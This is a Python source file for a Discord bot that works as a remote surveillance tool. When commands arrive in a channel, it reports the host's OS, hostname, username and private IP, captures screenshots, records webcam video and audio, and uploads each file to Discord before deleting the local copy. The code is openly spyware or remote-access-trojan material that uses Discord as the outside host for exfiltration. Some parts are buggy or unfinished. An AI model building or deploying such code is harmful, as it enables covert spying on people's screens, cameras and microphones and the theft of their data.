# Discord imports
from discord.ext import commands
import discord, os, time

from dotenv import load_dotenv
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.all()
client = discord.Client(intents=intents)



# This section grabs system information
import socket, platform, subprocess
hostname = socket.gethostname()

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
        if IP.startswith('172'):
            print("USER ROUTER NOT COMPATIBLE")
    except Exception:
        IP = '127.0.0.1'     
    finally:
        s.close()
    return IP


# This section takes a screenshot (depending on the OS)
from subprocess import call
from time import gmtime, strftime

# Create the new directory if it doesn't exist
current_directory = os.path.dirname(os.path.abspath(__file__))
ss_directory = os.path.join(current_directory, "screenshots")
if not os.path.exists(ss_directory):
    os.makedirs(ss_directory)

# screenshot function
def take_screen_shot():

    # create file name and add to new path
    file_name = "Screenshot" + strftime("%Y-%m-%d %H:%M:%S", gmtime()) + ".jpg"
    file_path = os.path.join(ss_directory, file_name)

    # if on macos
    if platform.system()=="Darwin":
        # Call the screencapture command with the new file path
        call(["screencapture", file_path]) 

    # if on linux
    elif platform.system()=="Linux":
        import subprocess
        subprocess.run(["scrot", "screenshot.png"])

    # if on windows
    elif platform.system()=="Windows":
        import PIL.ImageGrab
        screenshot = PIL.ImageGrab.grab()
        screenshot.save("Win_screenshot.jpg")
        screenshot.close()
         
    else:
        print(platform.system()+": not supported!")

    for file in os.listdir(ss_directory):
        if file.endswith(".jpg"):
            print(file)
            time.sleep(2)   
    print(f"Screenshot captured and saved at: {file_path}")



@client.event
async def on_ready():
    print(f'{client.user} has connected to Discord!')
    print(platform.system(),platform.release(),platform.machine())


@client.event
async def on_message(message):
    # put all input into lowercase to avoid problems
    content = message.content.lower()
    if message.author == client.user:
        return
    if client.user.mentioned_in(message):
        await message.channel.send("You mentioned me?")
   
    # Help menu
    elif message.content == '!help':
        embed = discord.Embed(
            color = discord.Colour.gold()
        )
        embed.set_author(name="Commands List")
        embed.add_field(name="**!help**", value="Brings up this help page", inline=False)
        embed.add_field(name="**!placeholder**", value="this does not exist", inline=False)
        await message.channel.send(embed=embed) 

    #prints system info to discord channel
    elif message.content == '!info':
        #gets operating system to execute proper commands 
        if platform.system() == "Darwin" or platform.system() == "Linux":
            user = subprocess.getoutput("echo $USER")
            await message.channel.send("Operating system: "+platform.system())
            await message.channel.send("Machine: "+platform.machine())
            await message.channel.send("Processor: "+platform.processor())
            await message.channel.send("Hostname: "+hostname)
            await message.channel.send("Username: "+user)
            await message.channel.send("Private IP address: "+get_ip())

        else: #windows and other os
            user = os.environ['USERPROFILE']
            await message.channel.send("Operating system: "+platform.system())
            await message.channel.send("Machine: "+platform.machine())
            await message.channel.send("Processor: "+platform.processor())
            await message.channel.send("Hostname: "+hostname)
            await message.channel.send("Username: "+user)
            await message.channel.send("Private IP address: "+get_ip())
     
    # takes a screenshot then sends it to discord
    elif message.content == "!screenshot":
        take_screen_shot()
        for file in os.listdir(ss_directory):
            if file.endswith(".jpg"):
                file_path = os.path.join(ss_directory, file)
                await message.channel.send(file=discord.File(file_path))
                time.sleep(3)
                os.remove(file_path)

    # takes a camera recording and sends to discord
    elif message.content == "!record":
        await message.channel.send("Recording your webcam... ")
        os.system('osascript record.scpt {} "{}"')
        for file in os.listdir(current_directory):
            if file.endswith(".mov"): 
                await message.channel.send(file=discord.File(file))
                time.sleep(2)
                os.remove(file)

    elif message.content == "!audio":
        from src import record_audio
        for file in os.listdir(current_directory):
            if file.endswith(".wav"):
                file_path = os.path.join(current_directory, file)
                await message.channel.send(file=discord.File(file_path))
                time.sleep(3)
                os.remove(file_path)

    # TODO: add a message reciprocating function that reads user input
    # and outputs it to terminal until "!end" is declared.
    elif message.content == "!read":
        print(f"\nThis is an interactive text system from the terminal to Discord through {client.user}")
        print("Do not wait too long, otherwise the bot with be forced to restart due to timeout.")
        print("================================================================================================")
        while True:
            msg = input(f"Message to #{message.channel}: ")
            if msg == "goodbye":
                break
            elif msg == "!send":
                file = input()
                await message.channel(file)
            await message.channel.send(msg)

  

client.run(TOKEN)
